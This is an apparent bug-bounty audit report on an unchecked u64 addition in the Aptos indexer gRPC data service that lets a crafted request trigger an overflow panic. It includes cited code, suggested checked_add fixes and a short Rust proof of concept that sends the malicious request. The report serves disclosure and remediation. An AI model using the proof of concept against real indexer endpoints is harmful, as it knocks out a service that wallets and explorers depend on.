# Audit Report

## Title
Integer Overflow in GetTransactionsRequest Processing Causes Indexer Service Crash

## Summary
The indexer gRPC data service fails to validate that `starting_version + transactions_count` won't overflow when processing `GetTransactionsRequest`. With `overflow-checks = true` in the release build profile, malformed requests trigger integer overflow panics, crashing the service and causing denial of service.

## Finding Description

The vulnerability exists in two locations where `GetTransactionsRequest` is processed: [1](#0-0) [2](#0-1) 

Both services perform unchecked addition when calculating `ending_version`. The protobuf definition allows both fields to be `uint64`: [3](#0-2) 

The Aptos workspace configuration explicitly enables overflow checks in release builds: [4](#0-3) 

When an attacker sends a request where `starting_version + transactions_count` exceeds `u64::MAX`, the addition overflows. With `overflow-checks = true`, Rust panics instead of wrapping, terminating the service thread and crashing the indexer.

**Attack Flow:**
1. Attacker crafts `GetTransactionsRequest` with `starting_version = u64::MAX - 100` and `transactions_count = 200`
2. Request reaches `LiveDataService::run()` or `HistoricalDataService::run()`
3. Service attempts calculation: `(u64::MAX - 100) + 200 = overflow`
4. Rust runtime panics due to overflow-checks
5. Service crashes, requiring manual restart

The HistoricalDataService is particularly vulnerable since it requires clients to provide `starting_version`: [5](#0-4) 

## Impact Explanation

This is **High Severity** per Aptos bug bounty criteria:
- **API crashes**: Direct crash of the indexer gRPC data service
- **Denial of Service**: Any unauthenticated client can crash the service
- **Infrastructure disruption**: Indexer infrastructure becomes unavailable until manual restart
- **No authentication required**: The gRPC API is typically publicly accessible

The indexer service is critical infrastructure for dApps, wallets, and blockchain explorers that depend on it for transaction data. A crash disrupts the entire ecosystem's access to blockchain data.

## Likelihood Explanation

**Likelihood: High**

- **Easy to exploit**: Single malformed gRPC request with two large integers
- **No authentication**: gRPC endpoints are publicly accessible
- **Trivial payload**: No complex state manipulation required
- **Immediate impact**: Service crashes instantly on overflow
- **Repeatable**: Attacker can repeatedly crash the service

The attack requires only basic gRPC client knowledge and can be automated for persistent DoS.

## Recommendation

Add validation before the addition to prevent overflow:

**For LiveDataService:**
```rust
let ending_version = match request.transactions_count {
    Some(count) => {
        starting_version.checked_add(count)
            .ok_or_else(|| Status::invalid_argument(
                "starting_version + transactions_count would overflow"
            ))?
    },
    None => u64::MAX,
};
let ending_version = Some(ending_version);
```

**For HistoricalDataService:**
```rust
let ending_version = request.transactions_count.and_then(|count| {
    starting_version.checked_add(count)
}).or_else(|| {
    if request.transactions_count.is_some() {
        let _ = response_sender.blocking_send(Err(Status::invalid_argument(
            "starting_version + transactions_count would overflow"
        )));
        COUNTER.with_label_values(&["historical_data_service_invalid_request"]).inc();
        None
    } else {
        Some(u64::MAX)
    }
});
if ending_version.is_none() && request.transactions_count.is_some() {
    continue;
}
```

Additionally, validate `batch_size` against the documented 1000 limit as the protobuf specification requires: [6](#0-5) 

## Proof of Concept

```rust
// PoC: Crash indexer service with overflow
use aptos_protos::indexer::v1::{GetTransactionsRequest, data_service_client::DataServiceClient};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to indexer gRPC service
    let mut client = DataServiceClient::connect("http://indexer-service:50051").await?;
    
    // Craft malicious request causing overflow
    let malicious_request = GetTransactionsRequest {
        starting_version: Some(u64::MAX - 100),
        transactions_count: Some(200),  // This causes overflow
        batch_size: None,
        transaction_filter: None,
    };
    
    // Send request - service will panic and crash
    let response = client.get_transactions(Request::new(malicious_request)).await;
    
    // Service crashes before returning response
    println!("Response: {:?}", response);
    Ok(())
}
```

**Expected Result**: The indexer service panics with "attempt to add with overflow" and terminates.

**Notes**

This vulnerability affects both the live and historical data services in the indexer-grpc-data-service-v2 component. While the indexer is not part of consensus and doesn't directly affect blockchain security, it is critical infrastructure that the Aptos ecosystem depends on for data access. The combination of missing input validation and enabled overflow checks creates an easily exploitable crash condition.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L123-125)
```rust
                let ending_version = request
                    .transactions_count
                    .map(|count| starting_version + count);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L72-81)
```rust
                if request.starting_version.is_none() {
                    let err = Err(Status::invalid_argument("Must provide starting_version."));
                    info!("Client error: {err:?}.");
                    let _ = response_sender.blocking_send(err);
                    COUNTER
                        .with_label_values(&["historical_data_service_invalid_request"])
                        .inc();
                    continue;
                }
                let starting_version = request.starting_version.unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L108-110)
```rust
                let ending_version = request
                    .transactions_count
                    .map(|count| starting_version + count);
```

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L19-26)
```text
message GetTransactionsRequest {
  // Required; start version of current stream.
  optional uint64 starting_version = 1 [jstype = JS_STRING];

  // Optional; number of transactions to return in current stream.
  // If not present, return an infinite stream of transactions.
  optional uint64 transactions_count = 2 [jstype = JS_STRING];

```

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L27-29)
```text
  // Optional; number of transactions in each `TransactionsResponse` for current stream.
  // If not present, default to 1000. If larger than 1000, request will be rejected.
  optional uint64 batch_size = 3;
```

**File:** Cargo.toml (L921-923)
```text
[profile.release]
debug = true
overflow-checks = true
```
